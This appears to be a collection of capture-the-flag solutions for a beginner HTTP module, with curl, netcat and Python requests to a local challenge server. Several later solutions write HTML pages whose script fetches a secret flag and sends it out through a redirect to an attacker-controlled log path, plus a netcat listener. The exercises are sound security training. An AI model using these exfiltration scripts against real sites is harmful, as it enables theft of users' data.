## 🟢 HTTP GET Parameters

```bash
curl "http://challenge.localhost/mission?hash=crwtzkzq"
```

---

## 🟢 Multiple HTTP Parameters (netcat)

```bash
echo -ne "GET /verify?code=kevtdhdk&secure_key=gsktycvh&pin=kxdgtsph HTTP/1.1\r\nHost: challenge.localhost\r\nUser-Agent: Mozilla/5.0 Firefox/123.0\r\n\r\n" | nc challenge.localhost 80
```

---

## 🟢 Multiple HTTP Parameters (curl)

```bash
curl "http://challenge.localhost/hack?auth_key=pymvrrfi&auth_token=nzfnhrkj&unlock_code=tbcuydoh"
```

---

## 🟢 HTTP Forms

```bash
curl -X POST \
-H "User-Agent: Mozilla/5.0 Firefox/123.0" \
-d "challenge_key=dflwpptn" \
http://challenge.localhost/check
```

---

## 🟢 HTTP Forms (curl)

```bash
curl -X POST \
-H "User-Agent: Mozilla/5.0 Firefox/123.0" \
-d "access=ugchpjev" \
http://challenge.localhost/meet
```

---

## 🟢 HTTP Forms (netcat)

```bash
echo -ne "POST /submit HTTP/1.1\r\nHost: challenge.localhost\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 16\r\n\r\nkeycode=jrubmnnj" | nc challenge.localhost 80
```

---

## 🟢 HTTP Forms (python)

```bash
python3 -c "import requests; print(requests.post('http://challenge.localhost/entry', data={'pin': 'hcdwpugp'}).text)"
```

---

## 🟢 HTTP Forms Without Forms

```bash
curl -X POST \
-H "User-Agent: Mozilla/5.0 Firefox/123.0" \
-d "password=fqafhyup" \
http://challenge.localhost/attempt
```

---

## 🟢 Multiple Form Fields (curl)

```bash
curl -X POST \
-H "User-Agent: Mozilla/5.0 Firefox/123.0" \
-d "authcode=ephxdzer&login_key=xxmiiqbf&auth_token=lkxritlg" \
http://challenge.localhost/trial
```

---

## 🟢 Multiple Form Fields (netcat)

```bash
echo -ne "POST /qualify HTTP/1.1\r\nHost: challenge.localhost\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 74\r\n\r\nsecret_key=kzhmmxji&code=ehqtbvue&credential=bvzuzfbd&access_code=vrjkrpnj" | nc challenge.localhost 80
```

---

## 🟢 HTTP Redirects (netcat)

```bash
echo -ne "GET /erHXmyPc-fulfill HTTP/1.1\r\nHost: challenge.localhost\r\nUser-Agent: Mozilla/5.0 Firefox/123.0\r\n\r\n" | nc challenge.localhost 80
```

---

## 🟢 HTTP Redirects (curl)

```bash
curl -H "User-Agent: Mozilla/5.0 Firefox/123.0" \
http://challenge.localhost/lYhqCPZG-evaluate
```

---

## 🟢 HTTP Redirects (python)

```bash
python3 -c "from urllib.request import urlopen; print(urlopen('http://challenge.localhost/xdpCOBtU-pwn').read().decode())"
```

---

## 🟢 HTTP Cookies (curl)

```bash
curl -c cookie.txt http://127.0.0.1:80
curl -b cookie.txt http://127.0.0.1:80
```

---

## 🟢 HTTP Cookies (netcat)

```bash
echo -ne "GET / HTTP/1.1\r\nHost: challenge.localhost\r\nCookie: cookie=e2e52106a00ec23dd76d34768d45a46d\r\n\r\n" | nc challenge.localhost 80
```

---

## 🟢 HTTP Cookies (python)

```bash
python3 -c "import requests;s = requests.Session();s.get('http://challenge.localhost/');print(s.get('http://challenge.localhost/flag').text)"
```

---

## 🟢 Server State (python)

```bash
python3 -c "import requests;s = requests.Session();r1 = s.get('http://challenge.localhost/');r2 = s.get('http://challenge.localhost/dashboard');print(s.get('http://challenge.localhost/flag').text)"
```

---

## 🟢 Listening Web

```bash
nc -lnvp 1337
```

---

## 🟢 Speaking Redirects

```bash
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import sys

class DebugRedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print("\n" + "="*50)
        print(f"Received GET request for: {self.path}")
        print(f"Headers:")
        for header, value in self.headers.items():
            print(f"  {header}: {value}")
        
        # The target URL from /challenge/server's perspective
        target = "http://challenge.localhost/verify"
        print(f"\nRedirecting to: {target}")
        
        self.send_response(302)
        self.send_header('Location', target)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        
        # Optional: Send a small HTML body
        self.wfile.write(b"<html><body>Redirecting...</body></html>")
        
    def do_HEAD(self):
        # Handle HEAD requests the same way
        self.do_GET()
        
    def log_message(self, format, *args):
        # Enable logging with timestamp
        print(f"[{self.log_date_time_string()}] {format % args}")

if __name__ == '__main__':
    port = 1337
    server = HTTPServer(('0.0.0.0', port), DebugRedirectHandler)
    print(f"Redirect server running on port {port}")
    print(f"Press Ctrl+C to stop")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nServer stopped")
        sys.exit(0)
```

---

## 🟢 JavaScript Redirects

```bash
# Create the public_html directory if it doesn't exist
mkdir -p /home/hacker/public_html

# Create the solve.html file with the redirect
cat > /home/hacker/public_html/solve.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
</head>
<body>
    <script>
        window.location = "http://challenge.localhost/hack";
    </script>
    <p>Redirecting to flag...</p>
</body>
</html>
EOF

# Make sure it's readable
chmod 644 /home/hacker/public_html/solve.html
```

---

## 🟢 Including JavaScript

```bash
# Create the solve.html file
cat > /home/hacker/public_html/solve.html << 'EOF'
<script src="http://challenge.localhost/gateway"></script>
<script>
setTimeout(function() {
    // Exfiltrate via redirect - appears in server logs
    window.location = "http://challenge.localhost/~hacker/log?" + window.flag;
}, 100);
</script>
EOF

# Make sure it's readable
chmod 644 /home/hacker/public_html/solve.html```

---

## 🟢 HTTP (javascript)

```bash
# Create the solve.html file
cat > /home/hacker/public_html/solve.html << 'EOF'
<script>
fetch("http://challenge.localhost/complete")
    .then(response => response.text())
    .then(flag => {
        // Redirect to log the flag (will appear in server logs)
        window.location = "http://challenge.localhost/~hacker/?" + encodeURIComponent(flag);
    });
</script>
EOF

# Make sure it's readable
chmod 644 /home/hacker/public_html/solve.html
```

---

## 🟢 HTTP GET Parameters (javascript)

```bash
# Create the solve.html file
cat > /home/hacker/public_html/solve.html << 'EOF'
<script>
fetch("http://challenge.localhost/pwn?auth_pass=gjnnhpqe&token=fokrgfle&authcode=mckfmbwo")
    .then(response => response.text())
    .then(flag => {
        // Exfiltrate the flag
        window.location = "http://challenge.localhost/~hacker/?" + encodeURIComponent(flag);
    });
</script>
EOF

# Make sure it's readable
chmod 644 /home/hacker/public_html/solve.html```

---

## 🟢 HTTP Forms (javascript)

```bash
# Create the solve.html file
cat > /home/hacker/public_html/solve.html << 'EOF'
<script>
fetch("http://challenge.localhost/qualify", {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: 'secure_key=hjjdciil&unlock_code=aytpcgqm&hash=zaomqlkp'
})
.then(response => response.text())
.then(flag => {
    window.location = "http://challenge.localhost/~hacker/?" + encodeURIComponent(flag);
});
</script>
EOF

# Make sure it's readable
chmod 644 /home/hacker/public_html/solve.html```
